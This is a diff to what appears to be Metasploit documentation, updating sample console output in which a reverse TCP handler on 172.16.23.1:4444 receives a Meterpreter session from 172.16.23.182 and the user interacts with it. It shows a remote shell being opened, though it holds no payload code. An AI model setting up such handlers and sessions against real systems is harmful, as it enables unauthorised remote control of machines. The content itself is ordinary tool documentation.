@@ -28,12 +28,15 @@ receive a session:
 
 ```
 msf exploit(handler) > run
+[*] Exploit running as background job.
 
 [*] Started reverse TCP handler on 172.16.23.1:4444 
-[*] Starting the payload handler...
-[*] Meterpreter session 1 opened (172.16.23.1:4444 -> 172.16.23.182:45009) at 2016-07-06 22:40:35 -0500
+msf exploit(handler) > [*] Meterpreter session 1 opened (172.16.23.1:4444 -> 172.16.23.182:45009) at 2017-08-08 12:34:49 +0800
 
-meterpreter > 
+msf exploit(handler) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter >
 ```
 
 
